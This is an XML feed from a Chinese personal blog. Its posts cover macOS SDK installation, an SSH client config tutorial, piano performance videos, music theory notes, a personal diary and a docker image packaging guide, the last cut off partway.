class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">scarleastdeMacBook-Pro:hexo_auto scarleast$ xcode-select --install<br>xcode-select: note: install requested <span class="hljs-keyword">for</span> <span class="hljs-built_in">command</span> line developer tools<br></code></pre></td></tr></table></figure><p>输入<code>xcode-select --install</code>后，会弹出图形界面，按照提示安装就行了，安装完成查看gcc版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">scarleastdeMacBook-Pro:hexo_auto scarleast$ gcc -v<br>Configured with: --prefix=/Library/Developer/CommandLineTools/usr --with-gxx-include-dir=/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/c++/4.2.1<br>Apple clang version 11.0.0 (clang-1100.0.33.8)<br>Target: x86_64-apple-darwin19.2.0<br>Thread model: posix<br>InstalledDir: /Library/Developer/CommandLineTools/usr/bin<br></code></pre></td></tr></table></figure><p>其实发现并不是gcc，是clang，不过不影响接下来安装<code>pycrypto</code>了。</p><h1 id="安装SDK过程"><a href="#安装SDK过程" class="headerlink" title="安装SDK过程"></a>安装SDK过程</h1><p>安装了<code>xcode</code>后就可以正常安装SDK了：</p><ul><li><p>安装pycrypto</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">scarleastdeMacBook-Pro:hexo_auto scarleast$ pip3.6  install pycrypto<br>Collecting pycrypto<br>  Using cached https://files.pythonhosted.org/packages/60/db/645aa9af249f059cc3a368b118de33889219e0362141e75d4eaf6f80f163/pycrypto-2.6.1.tar.gz<br>Installing collected packages: pycrypto<br>  Running setup.py install <span class="hljs-keyword">for</span> pycrypto ... <span class="hljs-keyword">done</span><br>Successfully installed pycrypto-2.6.1<br>You are using pip version 10.0.1, however version 19.3.1 is available.<br>You should consider upgrading via the <span class="hljs-string">&#x27;pip install --upgrade pip&#x27;</span> <span class="hljs-built_in">command</span>.<br></code></pre></td></tr></table></figure></li><li><p>安装百度SDK</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">scarleastdeMacBook-Pro:hexo_auto scarleast$ pip3.6 install bce-python-sdk<br>Collecting bce-python-sdk<br>  Using cached https://files.pythonhosted.org/packages/04/a6/72a4bbe372de7438978f5dd976f3a4981cd245d7995112b31bb77aa41656/bce_python_sdk-0.8.32-py2.py3-none-any.whl<br>Collecting six&gt;=1.4.0 (from bce-python-sdk)<br>  Using cached https://files.pythonhosted.org/packages/65/26/32b8464df2a97e6dd1b656ed26b2c194606c16fe163c695a992b36c11cdf/six-1.13.0-py2.py3-none-any.whl<br>Requirement already satisfied: future&gt;=0.6.0 <span class="hljs-keyword">in</span> /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages (from bce-python-sdk) (0.18.2)<br>Requirement already satisfied: pycrypto&gt;=2.4 <span class="hljs-keyword">in</span> /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages (from bce-python-sdk) (2.6.1)<br>Installing collected packages: six, bce-python-sdk<br>Successfully installed bce-python-sdk-0.8.32 six-1.13.0<br>You are using pip version 10.0.1, however version 19.3.1 is available.<br>You should consider upgrading via the <span class="hljs-string">&#x27;pip install --upgrade pip&#x27;</span> <span class="hljs-built_in">command</span>.<br></code></pre></td></tr></table></figure></li></ul><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>哎，现在搞得人有点冒火，最后因为xcode的问题，没办法编译，导致的报错。还是那句话吧，出问题了<strong>先看日志，先看日志，先看日志！！！！</strong></p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加菲猫的钢琴演奏——《FT.ISLAND LOVE LOVE LOVE》</title>
    <link href="/posts/34782d87.html"/>
    <url>/posts/34782d87.html</url>
    
    <content type="html"><![CDATA[<h1 id="开头先说两句"><a href="#开头先说两句" class="headerlink" title="开头先说两句"></a>开头先说两句</h1><p>这首曲子是<strong>FTISLAND</strong>的《LOVE LOVE LOVE》，很喜欢这首歌，后来偶然的机会在youtube上看到了钢琴的版本，于是便找到了谱子，弹了下来。</p>        <style>.bbplayer{width: 100%; max-width: 850px; margin: auto}</style>        <div class="bbplayer">        <iframe class="bbplayer" id="mmedia-nweQImtJ" src="//player.bilibili.com/player.html?bvid=BV19x41147R1&page=1&high_quality=1&danmaku=false"            allowfullscreen="no"            scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups"></iframe>        </div>        <script>            document.getElementById("mmedia-nweQImtJ").style.height=document.getElementById("mmedia-nweQImtJ").scrollWidth*0.76+"px";            window.onresize = function(){              document.getElementById("mmedia-nweQImtJ").style.height=document.getElementById("mmedia-nweQImtJ").scrollWidth*0.76+"px";            };        </script>        <p>其他钢琴视频参见<a href="https://www.gaficat.com/tags/%E6%BC%94%E5%A5%8F/">演奏分类</a>~</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
      <category>演奏</category>
      
    </categories>
    
    
    <tags>
      
      <tag>音乐</tag>
      
      <tag>演奏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加菲猫的钢琴演奏-《花的微笑》</title>
    <link href="/posts/a13a5c78.html"/>
    <url>/posts/a13a5c78.html</url>
    
    <content type="html"><![CDATA[<h1 id="开头先说两句"><a href="#开头先说两句" class="headerlink" title="开头先说两句"></a>开头先说两句</h1><p>我希望把自己弹的曲子，时不时更新，也整理到博客当中。</p><p>去年这个时候，自己一个人孤零零听了石进的音乐会，我就记得开场，一个第一眼看上去很普通小哥走上台，鞠了一躬，不久，音乐会就在缓慢、悠扬的旋律中展开，瞬间觉得这个人气质不一样了。</p><p>那是我第一次自费、坐第一排听音乐会，我记住了那首曲子的名字，《花的微笑》，接下里，欣赏吧~</p>        <style>.bbplayer{width: 100%; max-width: 850px; margin: auto}</style>        <div class="bbplayer">        <iframe class="bbplayer" id="mmedia-NWYwTbmj" src="//player.bilibili.com/player.html?bvid=BV11b411S7qB&page=1&high_quality=1&danmaku=false"            allowfullscreen="no"            scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups"></iframe>        </div>        <script>            document.getElementById("mmedia-NWYwTbmj").style.height=document.getElementById("mmedia-NWYwTbmj").scrollWidth*0.76+"px";            window.onresize = function(){              document.getElementById("mmedia-NWYwTbmj").style.height=document.getElementById("mmedia-NWYwTbmj").scrollWidth*0.76+"px";            };        </script>        <p>其他钢琴视频参见<a href="https://www.gaficat.com/tags/%E6%BC%94%E5%A5%8F/">演奏分类</a>~</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
      <category>演奏</category>
      
    </categories>
    
    
    <tags>
      
      <tag>音乐</tag>
      
      <tag>演奏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加菲猫的乐理学习笔记（五）——音域与音区</title>
    <link href="/posts/6a7cc86b.html"/>
    <url>/posts/6a7cc86b.html</url>
    
    <content type="html"><![CDATA[<h1 id="音域"><a href="#音域" class="headerlink" title="音域"></a>音域</h1><p>从低音到高音，音列的总范围叫做<strong>“音域”</strong>。音域包括乐音体系总的音域和个别人声或乐器以及某手音乐作品的音域。总音域的范围是C<sub>2</sub>到c<sup>5</sup>，总的音域不是所有乐器都能演奏的，很多乐器只能演奏总音域的很小一部分。</p><blockquote><p>钢琴的音域为A<sub>2</sub>到c<sup>5</sup></p></blockquote><h1 id="音区"><a href="#音区" class="headerlink" title="音区"></a>音区</h1><p>在乐音体系的总音域中，小字组、小字一组、小子二组被认为是<strong>中音区</strong>，打字二组、大字一组、大字组被认为是<strong>低音区</strong>，小字三组、小字四组、小字五组被认为是<strong>高音区</strong>。</p><p>通常，不同人、不同乐器音区是不同的，如小提琴的低音区是和大提琴的高音区有重叠，钢琴的音域较广，其音区如下图所示：</p><p><img src="https://pic.gaficat.com/maker/%E9%92%A2%E7%90%B4%E9%9F%B3%E5%8C%BA.png" alt="钢琴音区"></p><p>在音乐表现中，不同音区有着不同的表现特征，各种人声、乐器的音区的表现特征也不尽相同。</p><ul><li>高音区：清脆明亮。</li><li>中音区：抒情、优美、最富表现力。</li><li>低音区：浑厚深沉。</li></ul>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
      <category>乐理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>乐理</tag>
      
      <tag>音乐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过SSH客户端配置文件管理多个秘钥</title>
    <link href="/posts/50ccaf37.html"/>
    <url>/posts/50ccaf37.html</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>本文介绍了常见的ssh多秘钥管理的方式（SSH客户端配置文件的基础知识），并介绍了一些最常见的配置选项可以通过本方式，更方便使用ssh、scp、git等命令完成认证。</p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>最近突然有了一个挺抓狂的问题，github不同项目设置了不同的ssh key，公司、自己的VPS秘钥不同，有的VPS在国外，需要连接代理，如果都需要通过SSH连接到多个远程系统，就会发现记住所有的远程IP地址，不同的用户名，非标准端口和各种命令行选项非常困难。</p><p>一种选择是为每个远程服务器连接<a href="https://linuxize.com/post/how-to-create-bash-aliases/">创建一个bash别名</a>。但是，还有另一个更好，更简单的解决方案。OpenSSH允许您设置每个用户的配置文件，可以在其中为连接到的每台远程计算机存储不同的SSH选项。</p><h1 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h1><p>配置的过程，简单来说，就是创建一个配置文件：<code>~/.ssh/config</code>，将连接需要的参数填好即可。</p><h2 id="预备工作"><a href="#预备工作" class="headerlink" title="预备工作"></a>预备工作</h2><p>我们假设您使用的Linux或macOS系统已安装OpenSSH客户端。</p><h2 id="SSH配置文件位置"><a href="#SSH配置文件位置" class="headerlink" title="SSH配置文件位置"></a>SSH配置文件位置</h2><p>OpenSSH客户端配置文件位于<code>～/.ssh/config</code>，若没有，需要手动创建：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkdir -p ~/.ssh &amp;&amp; chmod 700 ~/.ssh<br>touch ~/.ssh/config &amp;&amp; chmod 600 ~/.ssh/config<br></code></pre></td></tr></table></figure><h2 id="SSH配置文件结构"><a href="#SSH配置文件结构" class="headerlink" title="SSH配置文件结构"></a>SSH配置文件结构</h2><p>SSH配置文件采用如下结构：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Host hostname1<br>    SSH_OPTION value<br>    SSH_OPTION value<br><br>Host hostname2<br>    SSH_OPTION value<br></code></pre></td></tr></table></figure><ul><li>Host: 是给该主机其的别称，这里因为我的机器是腾讯云的，取名为tencent</li><li>ServerAliveInterval: 因为腾讯云的机器，默认一段时间不操作后会断开连接，这个参数是为了保持连接的。20的意思是每20秒向服务器发送一个空字符，保持连接。</li><li>HostName：主机名，写VPS的地址就行了。</li><li>User：用户名</li><li>Port：端口</li><li>IdentityFile: 秘钥路径</li></ul><h2 id="基本示例配置文件"><a href="#基本示例配置文件" class="headerlink" title="基本示例配置文件"></a>基本示例配置文件</h2><figure class="highlight shell"><figcaption><span>~/.ssh/config</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">Host dev<br>    HostName dev.example.com<br>    User john<br>    Port 2322<br></code></pre></td></tr></table></figure><ul><li>Host：别称为dev</li><li>HostName：主机名为dev.example.com</li><li>User：用户名为john</li><li>Port端口为2322</li></ul><p>现在就可以输入如下命令查看效果了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh dev<br></code></pre></td></tr></table></figure><h2 id="常用的一些其他参数"><a href="#常用的一些其他参数" class="headerlink" title="常用的一些其他参数"></a>常用的一些其他参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Host dev<br>    HostName dev.example.com<br>    User john<br>    Port 2322<br>    IdentityFile ~/.ssh/temple_ssh_key<br>    ServerAliveInterval 20<br>    ProxyCommand nc -X 5 -x 127.0.0.1:7891 %h %p<br></code></pre></td></tr></table></figure><ul><li>IdentityFile：使用秘钥登录时的秘钥路径。</li><li>ServerAliveInterval：部分VPS一段时间不输入字符会断开连接，这里的20表示每20秒向服务器发送一个空字符保持连接。</li><li>ProxyCommand：代理，表示使用127.0.0.1：7891，socks5的代理连接VPS。</li></ul><p>事实上，SSH的配置文件也被其他程序，如scp，sftp和rsync，一个常用的场景是同步文件，如我需要通过scp拷贝一个文件到远程的服务器，通常记住多个服务器的地址和配置很困难，若如上所示，完成了配置文件的设置，我们只需要输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scp ~/sample dev:~/sample<br></code></pre></td></tr></table></figure><p>若没有配置文件，我们需要输入非常长的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scp -i <span class="hljs-string">&quot;~/.ssh/temple_ssh_key&quot;</span> -p 2322 ~/sample john@dev.example.com:~/sample<br></code></pre></td></tr></table></figure><p>便捷程度一目了然。</p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>小技巧</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux命令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加菲猫的乐理学习笔记（四）——音的分组</title>
    <link href="/posts/1e3479cf.html"/>
    <url>/posts/1e3479cf.html</url>
    
    <content type="html"><![CDATA[<h1 id="开头先说几句"><a href="#开头先说几句" class="headerlink" title="开头先说几句"></a>开头先说几句</h1><p>今天想起了之前玩deemo时一首好听的钢琴曲，作为开头吧，琴行教琴的小姐姐在练这个曲子。我觉得这首曲子的开头真的好空灵，相比于后面的热闹，前面给人的感觉很棒。不过吧，V.K克的演出是有乐队伴奏的，即使没有乐队，也是使用键盘，配上伴奏演奏的，也没见到有纯钢琴演奏的，所以这个时候就觉得编曲键盘的优势凸显出来了，一个人一只乐队，多热闹。</p>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <script src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script>            <meting-js  id="003Lr4Cq2ILdxK" server="tencent" type="song" autoplay="false" mutex="true" listmaxheight="340px" preload="auto" theme="#ad7a86" loop="none"></meting-js><h2 id="音名与唱名的区别"><a href="#音名与唱名的区别" class="headerlink" title="音名与唱名的区别"></a>音名与唱名的区别</h2><ul><li><strong>音名</strong>就是音高的名称，音名和音高是绝对关系的。即：C、D、E、F、G、A、B</li><li><strong>唱名</strong>用来教授音高和视唱的音乐教育方法，唱名和音高的关系是相对的。即：1（do），2（re），3（mi），4（fa），5（sol），6（la），7（si）</li></ul><blockquote><p>tips：为了更清楚说明音名、唱名和音高的关系，这里提出一个<strong>标准音</strong>的概念，目前国际通用的标准高度是，每秒振动440次的音定为标准音。这个标准音，就是音名中的<strong>小字一组的a</strong>（小字一组我们后面会提到）。但是唱名是相对的，它的do有可能是440赫兹，它的la也有可能是440赫兹，音名更强调的是不同音之间一种相对音高的关系。</p></blockquote><p>音名和唱名在钢琴上的位置（<strong>以C调为例</strong>）：</p><center><img src="https://pic.gaficat.com/maker/%E6%88%AA%E5%B1%8F2019-12-04%E4%B8%8B%E5%8D%8811.32.35.png" alt="音名、唱名在钢琴上的位置" style="zoom: 33%;" /> <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">音名、唱名在钢琴上的位置</div></br> </center><p>虽然上图中，6对应的是A，但是这仅仅针对C大调如此，在之后的笔记中，我将解释调与唱名的关系。</p><h2 id="音的分组与认识钢琴键盘"><a href="#音的分组与认识钢琴键盘" class="headerlink" title="音的分组与认识钢琴键盘"></a>音的分组与认识钢琴键盘</h2><p>钢琴键盘一共有88个键，其中52个白键，36个黑键。我们可以发现一个规律，钢琴上的黑键，是两个、三个，两个、三个这种规律<strong>循环排列</strong>的，在钢琴键盘上，两个黑键左边的第一个白键就是c，往右依次就是d、e、f、g、a、b、c，我们把最中间的C成为<strong>中央C</strong>，如下图所示。</p><blockquote><p>Tips: 中央C每秒中振动约261次。</p></blockquote><center><img src="https://pic.gaficat.com/maker/%E9%92%A2%E7%90%B4%E9%94%AE%E7%9B%98%E4%B8%8E%E5%88%86%E7%BB%84.jpg" alt="标准钢琴键盘与分组"  />  <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">标准钢琴键盘与分组</div></br>  </center><p>我们知道基本音级对应钢琴上的白键，以C、D、E、F、G、A、B七个音循环，那么问题就来了，琴键上的88个音，用这7个音名表示，我们无法区分音名相同而高度不同的音。例如：如果我们说一个音是C，那键盘上有这么多C，到底说的是哪一个C呢？这就有了<strong>音的分组</strong>。在上图中我们可以发现，我们将C、D、E、F、G、A、B区间内的音作为一组，一共可以分九组，那么中央C所在的分组就称其为<strong>小字一组</strong>。小字一组右侧，分别为小字二组、小字三组、小字四组、小字五组。小字一组左侧分别为小字组、大字组、大字一组、大字二组。</p><p>音的分组应该如何表示？</p><ul><li>小字组：统一用小写字母表示，c、d、e、f、g、a、b，并在右上方加数字以表示。如中央C（小字一组的C）就是c<sup>1</sup>，小子二组的D就是d<sup>2</sup>。</li><li>大字组：统一用大写字母表示，C、D、E、F、G、A、B，并在右下方加数字以表示。如大字组的C就是C，大字二组的D就是D<sub>2</sub>。</li></ul><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>我自己弹了十几年琴，觉得自己白弹了，压根就没怎么听过什么音的分区，最开始在别人问什么是音名，什么是唱名的时候，也是一脸懵逼。我只知道，钢琴上的音对应五线谱上的音符是哪个，这就是我知道的乐理。</p><p>最后，琴之翼开头空灵的感觉给人说不上来的感觉，我想起了DNF？还是以前疯狂玩LOL的日子？总之吧，也是一些暗无天日，有些记忆你会模糊，但是听起一段音乐、一首歌的时候，你会瞬间回忆起那段记忆，真是一个挺神奇的事情。</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
      <category>乐理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>乐理</tag>
      
      <tag>音乐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019年11月最后一周的小日记</title>
    <link href="/posts/a819806c.html"/>
    <url>/posts/a819806c.html</url>
    
    <content type="html"><![CDATA[<h1 id="不知道说些什么的开头"><a href="#不知道说些什么的开头" class="headerlink" title="不知道说些什么的开头"></a>不知道说些什么的开头</h1><p>今天听到了这首歌，<strong>牵丝戏</strong>，勾起了自己的一些回忆，就用它开头吧！</p>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <script src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script>            <meting-js  id="30352891" server="netease" type="song" autoplay="false" mutex="true" listmaxheight="340px" preload="auto" theme="#ad7a86" loop="none"></meting-js><p>听到这首歌，我想到的，是大学时的新校门，卖鸡蛋仔的阿姨、跟我一路讨吃的狗子以及那家用罐子装的米线店，印象非常深刻。为什么呢？因为奋斗的记忆在那里。那时，我所在的实验室在学校的新校门附近，我每天的生活就是一个人在实验室，用51单片机写了自己这辈子第一个“大工程”——没有取得好成绩的搬运机器人，然后一个人在实验室通宵，深夜依靠不精准的延时一次次调试，一套程序，机器人每次跑出去的结果都是不一样的，自己真的好绝望。后来，大三、大四，实验室换了，也依然在新校门附近，仅存不多的印象，是和李哥通宵帮传媒小姐姐完成期中产品设计作业；和“常常”做数模比赛，三天三夜通宵，半夜出去找吃的；当然啦，还有在8教琴房（呵，我已经记不清楚教室号了），有时候晚上10点40，听到我练完琴的阿飘来找我聊会儿天就跑回对面室继续画画，我就自己一个人回寝室，形只影单。我觉得相比于我给人的冷漠之感，我内心很多时候还是很矫情、很伤感的。总之，也不知道为什么，<strong>听到这个歌，满脑子都是奋斗的孤独感，什么其他的感觉都没有。</strong></p><p>我脑子里闪过一句话：<strong>你现在的生活状态，源自你五年前正在做什么事。</strong>五年前，期中考试高数考了40多分，从拿着全年级两个人拿的国家奖学金，到成绩末尾的那几个，满脸苦笑。从自己争取成了班长，到意识到自己可能在之后挂科，提前辞去班长，心有不甘。从兴致勃勃参加红岩网校的培训，到写了几行java，打印了几个三角、爱心就默默放弃，彷徨无助。从顺利进入校学生会，到最后在学生会待不下去，不听会长的挽留直接离开，心猿意马。最后，毅然选择入了电子设计的坑，翘课、通宵，在实验室度过了大学的三年半时光。我不敢想象自己当初的决定如果变一下会怎么样，会不会因为自己成绩好些，本硕连读就能顺利上车，不过，我还是相信<strong>一命二运三风水四功德五读书</strong>，都是上天安排好的吧！</p><p>周一工作挺忙的，年报需要做一些修改，就发现自己怎么今年话都说不通顺了，内容是没写多少，倒是大boss的批注比我写的内容都多。另外呢，蜜罐的日志模块炸了，想看一些关于安卓ADB相关的日志，下周分享说一下，结果发现蜜罐版本更新以后，任何命令执行相关的日志都没有记录到。最后，用内网的机器测了一下pushbullet的api，果然，国外的月亮不好使。</p><h1 id="我又给冯冯惹毛啦！我可真棒"><a href="#我又给冯冯惹毛啦！我可真棒" class="headerlink" title="我又给冯冯惹毛啦！我可真棒"></a>我又给冯冯惹毛啦！我可真棒</h1><p>上周五，西安的几个小伙伴一起去团建，在密室待了一天，其实下午进密室我是拒绝的，我一直对密室这种东西挺抗拒的，要收掉你的手机，把你关进一个房子，我总是有些阴谋论的感觉吧，上午玩一回就得了。没成想，下午大家还选了一个恐怖主题的密室，嗯，有单人任务的那种，到现在想起单人任务，安全屋的我，听到对面屋，同伴的哀嚎和NPC的恐吓声，乐得不行。嗯，结果轮到自己，被NPC吓的飞起三尺高，撒腿就跑回安全屋。</p><p>接下来？接下来，玩了一天，被吓得筋疲力尽的我，很争气的在第二天睡过头了，我告诉过冯冯，我第二天一早去找她，结果冯冯上午问了我两次，我都没回她，我正在呼呼大睡呢。</p><blockquote><p>“我和同事约了，今天买东西，估计晚上才回家吧。”</p><p>“哦，那你们去吧。”</p><p>“我早上本身想问问你还来不来，结果你不回我，我就今天出来买东西了。”</p><p>“好嘛，我明天再找你。”</p><p>“不行你明天也别来了，我要收拾东西，忙忙叨叨的。”</p><p>“好的呀，听你的呀。”</p></blockquote><p>然后，我就度过了愉快的一个下午，什么也没干，嗯，我还兴高采烈的，明天不用找冯冯了，我可以订一箱怡宝，刚好明天等快递小哥上门。结果下午，气呼呼的冯冯就打电话过来问罪了：</p><blockquote><p>“你可真行？一天天的你在干什么？说好的今天来找我，我就在家里什么也不干等你吗？小助手也没写，博客也没更新，你在干什么？”</p></blockquote><p>一脸懵逼的我，好像突然觉得有什么不太对？冯冯怎么发火了？我做错啥了？哦，我好像放她鸽子了？我艹？她那句“不行你明天也别来了”好像是气话？乌拉拉？？？？？？？？？</p><p>你就看到一个160斤的胖子，冲进卫生间，洗了个澡以免油头见人，然后撒腿就去找冯冯。</p><h1 id="冯冯还是好哄的"><a href="#冯冯还是好哄的" class="headerlink" title="冯冯还是好哄的"></a>冯冯还是好哄的</h1><p>我抱着冯冯要是不生气了，我就进屋睡沙发，冯冯要还在生气，就扇我一巴掌我再自己回家的心态，踏上了找冯冯认错的路途。时不时探探冯冯的口风，看看脾气超级好的冯冯还有没有生气了，果然，见了面，再怎么生气的冯冯也就生不起来气了，我们手拉手回家啦。当晚，场面过于画面化，此处省略500字。</p><p>第二天，给冯冯做了一天苦力，帮冯冯收拾行李、打扫屋子，不过我这大懒狗，动一动就摊着不动了，其实也没干多少家务。下午就一起出门，吃冯冯下基层前的最后一顿饭，湘菜真好吃呀，虽然我是个爱吃辣但是不太能吃辣的狗子。</p><img src="https://pic.gaficat.com/maker/酱油肉末.jpg" alt="酱油肉末（姑且这么叫吧）真好吃" style="zoom: 33%;" /><img src="https://pic.gaficat.com/maker/手撕包菜.jpg" alt="手撕包菜也好吃" style="zoom:33%;" /><p>你可能想不到，我和冯冯，在她下基层的最后一个晚上，是在书店度过的，冯冯给我读了拥有一切的公主，我觉得冯冯要是做了哪个小孩子的麻麻，小孩子该每个晚上都找冯冯讲故事了，冯冯讲的好温柔。</p><img src="https://pic.gaficat.com/maker/拥有一切的公主.jpg" alt="拥有一切的公主" style="zoom:33%;" /><p>最后的最后，拉着冯冯的手，感觉真好！</p><img src="https://pic.gaficat.com/maker/和冯冯手拉手1.jpg" alt="拉手手" style="zoom:33%;" /><p>努力提升自己呀，争取把冯冯的戒指换成钻的~</p><img src="https://pic.gaficat.com/maker/和冯冯手拉手2.jpg" style="zoom:50%;" /><h1 id="你相信量子力学吗？"><a href="#你相信量子力学吗？" class="headerlink" title="你相信量子力学吗？"></a>你相信量子力学吗？</h1><p>佛教讲因果，物理讲量子力学，死亡搁浅讲连接。但我是相信，我是真的很爱冯冯的，我和冯冯是有连接的。毕竟今天是冯冯下基层的第一天，心里面竟然空落落的，怎么形容呢？就是你踏上大学旅途，离开父母；或是第一次到达工作的城市，离开学生身份，那第一个晚上，心里空落落的感觉。<strong>一个人，无论是物理还是心理上的距离远了，你真的有所感觉的，即使你们没有见面，很想念她呀。</strong></p><p>忽然想到<strong>学有所成</strong>，这是一个很好的成语。学生，学有所成，可能将获得一份好工作；工作的你，学有所成，可能多了一条出路；妻子，学有所成，你能给她更好的物质生活；父母，学有所成，你给了他们自豪的谈资。你可能发现，文章的开头在说奋斗的孤独感，文末也在说保持学习的状态。我不希望自己才二十来岁，时间就荒废在重复的机械工作或者游戏当中，我也希望看到这篇文章的你，能意识到提升自己的重要性。我希望到40、50岁都能保持良好的学习习惯。年轻时学习，是为了自己的前途；中年学习，是希望丰富自己的见识，为孩子指引方向；老年学习，是希望保持思维的锐利，即使相伴几十年，也再能给她惊喜。这个学习习惯在什么时候养成呢？希望是在冯冯下基层的这一年吧！希望她一年后回来，看到不断学习而变得更加优秀的狗子，可以不假思索的说，<strong>“我愿意嫁给你。”</strong></p><p>祝看到这篇文章的你，又帅又有钱！12月加油！！2019的最后一个月，加油！！</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>流水账</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何将docker容器打包成镜像？</title>
    <link href="/posts/4e31e6d1.html"/>
    <url>/posts/4e31e6d1.html</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>本文记录了一种不使用<code>Dockerfile</code>，将docker容器打包镜像的方法，番外篇讲解了给使用<code>PPA</code>安装了python的镜像安装第三方包的方法。</p><h1 id="开头先交代背景"><a href="#开头先交代背景" class="headerlink" title="开头先交代背景"></a>开头先交代背景</h1><p>写这篇文章的原因，是我从事蜜罐制作有很长的时间了，制作蜜罐时，需要将做好的蜜罐程序打包成docker镜像交付。通常，打包docker镜像的过程就是编写一个<code>Dockerfile</code>，之后通过<code>docker build</code>命令就可以打包一个镜像了。</p><blockquote><p>PS: <code>Dockerfile</code>的编写，可以理解为编写一堆命令，这堆命令做的事，就是基于一个基础镜像（这个镜像通常是选择官方的镜像），跑一个临时的容器，然后将代码添加到临时容器中并安装运行代码所需要的环境，最后将这个临时的容器打包成新的镜像，删除这个临时的镜像。</p></blockquote><p>这种方式就容易出现一个问题，<code>docker</code>官方的<code>ubuntu:16.04</code>镜像并没有带<code>python3.6</code>的环境，这使得我每次更新镜像时，都需要在<code>Dockerfile</code>中写相关的命令，安装一遍<code>python3.6</code>环境。但是<code>docker</code>官方的<code>ubuntu:16.04</code>镜像源在国外，由于网络的原因，国内访问经常超时，我们肯定第一时间想到更换源，但是官方的镜像极度精简，替换源会出现一系列问题，至少折腾了半天我是不想折腾了。所以为了不出现因为网络的原因，一个<code>Dockerfile</code>跑10分钟，结果超时了，又需要重新跑一次的蛋疼局面，<strong>我总结了可以直接将一个安装好环境的容器打包成镜像的方法</strong>。</p><p>那么以向官方的<code>ubuntu</code>镜像中安装<code>python3.6</code>为例，使用<code>Dockerfile</code>打包镜像和将容器打包成镜像的区别如何？</p><ul><li>通过<code>Dockerfile</code><ul><li>基于官方<code>ubuntu</code>镜像，将安装<code>python3.6</code>的命令写入<code>Dockerfile</code>，任何一步超时了就从头再